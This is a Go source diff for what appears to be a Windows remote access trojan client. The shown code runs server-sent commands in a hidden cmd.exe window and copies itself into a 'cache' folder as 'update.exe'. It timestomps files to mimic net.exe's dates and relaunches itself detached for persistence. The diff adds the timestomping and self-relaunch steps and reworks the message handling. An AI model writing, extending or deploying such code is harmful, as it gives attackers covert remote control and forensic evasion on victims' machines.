@@ -24,6 +24,7 @@ type Client struct {
 }
 
 func Exec(command string) ([]byte, error) {
+	fmt.Println("running ", command)
 	cmd_path := "C:\\Windows\\system32\\cmd.exe"
 	cmd_instance := exec.Command(cmd_path, "/c", command)
 	cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
@@ -31,40 +32,41 @@ func Exec(command string) ([]byte, error) {
 	return cmd_output, err
 }
 
-func (c *Client) runCommand(command string) {
-	//runs the requested command with Exec()
-	//and sends a message back to the server
+func ExecBackground(command string) {
+	fmt.Println("starting ", command)
+	var cmd *exec.Cmd
 
-	output, err := Exec(command)
-	if err != nil {
-		//handle err
-	}
-	data := common.CommandData{Command: command, Output: string(output)}
-	c.SendJsonMessage(common.CreateMessage(data))
-	fmt.Println("sent command data")
+	cmd_path := "C:\\Windows\\system32\\cmd.exe"
+	cmd = exec.Command(cmd_path, "/c", "start", "", command)
+	// Note: cmd /c start inherently creates a new, detached process.
+	// SysProcAttr for hiding the window might not directly apply to the
+	// newly started process in the same way.
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Start()
+
 }
 
-func (c *Client) HandleMessages() {
-	for {
-		message := c.GetWsMessage()
-		fmt.Println(message)
+// func (c *Client) HandleMessages() {
+// 	for {
+// 		message := c.GetWsMessage()
+// 		fmt.Println(message)
 
-		switch message.Type {
-		case "CommandData":
-			fmt.Println("command")
-			var content common.CommandData
-			common.DecodeData(message.Data, &content)
-			c.runCommand(content.Command)
-		case "StatsData":
-			fmt.Println("stats")
-			var content common.StatsData
-			common.DecodeData(message.Data, &content)
-			c.Name = content.Name
-		default:
-			fmt.Printf("Unknown message type: %s\n", message.Type)
-		}
-	}
-}
+// 		c.Actions[message.Type](message)
+// 		// switch message.Type {
+// 		// case "CommandData":
+// 		// 	fmt.Println("command")
+// 		// 	var content common.CommandData
+// 		// 	common.DecodeData(message.Data, &content)
+// 		// 	c.runCommand(content.Command)
+// 		// case "FileData":
+// 		// 	fmt.Println("file")
+// 		// 	var content common.FileData
+// 		// 	common.DecodeData(message.Data, &content)
+// 		// default:
+// 		// 	fmt.Printf("Unknown message type: %s\n", message.Type)
+// 		// }
+// 	}
+// }
 
 func (c *Client) SendStats() {
 	//sends the information about this client
@@ -82,12 +84,16 @@ func reconnect() {
 }
 
 func ChangeFileCreationDate(file string) {
-	//(Get-Item C:\Users\meow\AppData\Local\cache).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime
+	// (Get-Item C:\Users\meow\AppData\Local\cache).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime
 	//(Get-Item C:\Users\meow\AppData\Local\cache).LastWriteTime = (Get-Item C:\Windows\System32\net.exe).LastWriteTime
-	Exec("powershell /c " + fmt.Sprintf(`
-	(Get-Item %s).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime 
+	_ = fmt.Sprintf(`
+	(Get-Item %s).CreationTime = (Get-Item C:\Windows\System32\net.exe).CreationTime
 	&& (Get-Item %s).LastWriteTime = (Get-Item C:\Windows\System32\net.exe).LastWriteTime`,
-		file, file))
+		file, file)
+
+	uh := fmt.Sprintf(`powershell /c $newCreationDate = (Get-Item C:\Windows\System32\net.exe).CreationTime; $filePath='%s'; Set-ItemProperty -Path $filePath -Name LastWriteTime -Value $newCreationDate`, file)
+
+	Exec(uh)
 }
 
 func persist() {
@@ -96,19 +102,29 @@ func persist() {
 		panic(err)
 	}
 	fmt.Println(ex)
-	if strings.Contains(ex, "go-build") || strings.Contains(ex, "AppData") {
+	userHomeDir, _ := os.UserHomeDir()
+	if strings.Contains(ex, "go-build") || strings.Contains(ex, userHomeDir+"\\cache") {
 		//this will stop this function from doing anything else
 		//1. if this program is run with "go run"
 		//2. if the program already exists in the appdata folder
 		return
 	}
 
-	userCacheDir, _ := os.UserCacheDir()
-	programDir := path.Join(userCacheDir, "cache")
+	programDir := path.Join(userHomeDir, "cache")
 	if !common.FileExists(programDir) {
 		os.Mkdir(programDir, 0644)
 	}
-	common.CopyFile(ex, path.Join(programDir, "update.exe"))
+	destination := path.Join(programDir, "update.exe")
+	if common.FileExists(destination) {
+		os.Remove(destination)
+	}
+	common.CopyFile(ex, destination)
+
+	ChangeFileCreationDate(programDir)
+	ChangeFileCreationDate(destination)
+
+	ExecBackground(destination)
+	os.Exit(0)
 }
 
 func main() {
@@ -135,10 +151,10 @@ func main() {
 	client := Client{
 		Client: &common.Client{
 			Ws:             c,
-			Message:        make(chan common.Message),
 			MessageChannel: make(map[string]chan common.Message),
 		},
 	}
+	go client.initializeHandlers()
 
 	go client.HandleMessages()
 	fmt.Println("handle messages goroutine started")
